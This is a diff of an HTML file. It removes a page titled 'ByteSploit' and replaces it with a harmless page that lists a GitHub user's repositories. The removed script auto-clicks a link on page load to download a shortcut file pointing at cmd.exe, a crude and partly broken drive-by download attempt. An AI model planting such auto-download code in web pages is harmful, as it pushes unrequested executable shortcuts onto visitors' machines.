@@ -1,30 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>ByteSploit</title>
-</head>
-<body>
-	<script>
-		// Get the ?cmd= argument from the URL
-		const urlParams = new URLSearchParams(window.location.search);
-		const cmdArg = urlParams.get('cmd');
-
-		// Convert the command from URL friendly to normal characters
-		const cmd = decodeURIComponent(cmdArg);
-
-		// Set the content variable to the normal command
-		const content = cmd;
-
-		// Create a link element with the download attribute to automatically download the .lnk file
-		const link = document.createElement('a');
-		link.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent('[InternetShortcut]\nURL=file:///C:/Windows/System32/cmd.exe\nHotkey=162')); // Replace 'C:/Windows/System32/cmd.exe' with the path to cmd.exe on your system
-		link.setAttribute('download', 'shortcut.lnk');
-
-		// Append the link element to the body
-		document.body.appendChild(link);
-
-		// Simulate a click on the link element to trigger the download
-		link.click();
-	</script>
-</body>
+  <head>
+    <meta charset="UTF-8">
+    <title>BYT3W1Z4RD's GitHub Repositories</title>
+  </head>
+  <body>
+    <h1>BYT3W1Z4RD's GitHub Repositories</h1>
+    <ul id="repoList"></ul>
+    <script>
+      const username = 'BYT3W1Z4RD';
+      const repoList = document.getElementById('repoList');
+      const apiUrl = `https://api.github.com/users/${username}/repos`;
+      
+      fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+          data.forEach(repo => {
+            const repoItem = document.createElement('li');
+            const repoLink = document.createElement('a');
+            repoLink.href = repo.html_url;
+            repoLink.innerText = repo.name;
+            repoItem.appendChild(repoLink);
+            const repoDesc = document.createElement('p');
+            repoDesc.innerText = repo.description;
+            repoItem.appendChild(repoDesc);
+            repoList.appendChild(repoItem);
+          });
+        })
+        .catch(error => {
+          console.error(`Error fetching ${username}'s repositories:`, error);
+        });
+    </script>
+  </body>
 </html>
